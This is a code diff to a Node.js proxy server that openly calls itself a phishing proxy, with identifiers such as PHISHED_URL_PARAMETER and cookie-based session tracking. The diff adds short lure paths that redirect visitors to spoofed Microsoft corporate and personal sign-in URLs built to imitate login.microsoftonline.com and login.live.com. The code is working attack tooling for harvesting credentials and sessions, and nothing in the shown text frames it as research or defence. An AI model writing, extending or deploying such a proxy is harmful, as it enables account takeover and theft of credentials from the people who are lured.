@@ -49,7 +49,25 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
 
-    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
+    if (url === '/c' || url === '/corp' || url === '/corporate') {
+        // Redirect to full corporate login URL
+        clientResponse.writeHead(302, { 
+            Location: '/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F' 
+        });
+        clientResponse.end();
+        return;
+    }
+    
+    if (url === '/p' || url === '/personal') {
+        // Redirect to personal login URL (for future use)
+        clientResponse.writeHead(302, { 
+            Location: '/login?method=signin&mode=secure&client_id=4765445b-32c6-49b0-83e6-1d93765276ca&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F' 
+        });
+        clientResponse.end();
+        return;
+    }
+
+    else if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
             let session = currentSession;
